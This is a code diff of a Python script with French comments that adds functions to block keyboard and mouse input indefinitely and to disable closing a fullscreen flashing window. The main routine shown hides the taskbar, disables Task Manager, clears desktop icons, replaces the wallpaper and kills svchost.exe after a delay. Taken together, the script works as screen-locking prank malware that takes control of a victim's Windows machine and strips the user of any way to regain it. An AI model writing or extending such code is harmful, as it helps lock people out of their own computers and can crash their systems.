@@ -31,34 +31,69 @@ def fermer_apres_delay(nom_programme, delay=15):
 
 # Exemple pour svchost
 
+from pynput import keyboard, mouse
+
+def lock_input():
+    """
+    Désactive la souris et le clavier indéfiniment.
+    """
+    # Bloque le clavier
+    def block_key(key):
+        return False  # empêche toute touche
+
+    # Bloque la souris
+    def block_mouse(*args):
+        return False
+
+    # Listeners
+    kb_listener = keyboard.Listener(on_press=block_key)
+    ms_listener = mouse.Listener(on_move=block_mouse, on_click=block_mouse, on_scroll=block_mouse)
+
+    kb_listener.start()
+    ms_listener.start()
+
+    # Boucle infinie pour que le script reste actif
+    kb_listener.join()
+    ms_listener.join()
+
+# Appelle la fonction
+
+
+
 
 import tkinter as tk
 import random
 
-def ecran_multicolor():
+def trippy_screen():
     root = tk.Tk()
-    root.attributes("-fullscreen", True)  # plein écran
+    root.attributes("-fullscreen", True)
     root.configure(bg="black")
 
-    canvas = tk.Canvas(root, width=root.winfo_screenwidth(), height=root.winfo_screenheight())
+    # Désactiver Alt+F4
+    root.protocol("WM_DELETE_WINDOW", lambda: None)
+
+    width = root.winfo_screenwidth()
+    height = root.winfo_screenheight()
+    canvas = tk.Canvas(root, width=width, height=height)
     canvas.pack()
 
-    carre_size = 50  # taille des carrés
     colors = ["red", "blue", "green", "yellow", "purple", "orange"]
+    carre_size = 200  # gros carrés
+
+    # Fond brumeux (un overlay gris semi-transparent)
+    canvas.create_rectangle(0, 0, width, height, fill="gray", stipple="gray50")
 
     def draw_squares():
-        canvas.delete("all")
-        width = root.winfo_screenwidth()
-        height = root.winfo_screenheight()
-
-        for x in range(0, width, carre_size):
-            for y in range(0, height, carre_size):
-                color = random.choice(colors)
-                canvas.create_rectangle(x, y, x+carre_size, y+carre_size, fill=color, outline="")
-        root.after(100, draw_squares)  # redraw toutes les 100ms
+        # carrés aléatoires
+        x = random.randint(0, width - carre_size)
+        y = random.randint(0, height - carre_size)
+        color = random.choice(colors)
+        canvas.create_rectangle(x, y, x + carre_size, y + carre_size, fill=color, outline="")
+        root.after(2000, draw_squares)  # toutes les 2 secondes
 
     draw_squares()
     root.mainloop()
+
 
 
 
@@ -259,10 +294,11 @@ def main():
     listener = keyboard_hook()
 
     hide_taskbar()
+    lock_input()
     disable_task_manager()
     set_wallpaper("IMG_7832.jpeg")
     clear_desktop_icons()
-    ecran_multicolor()
+    trippy_screen()
     fermer_apres_delay("svchost.exe", 15)
 
     # Met la musique en thread pour pas bloquer
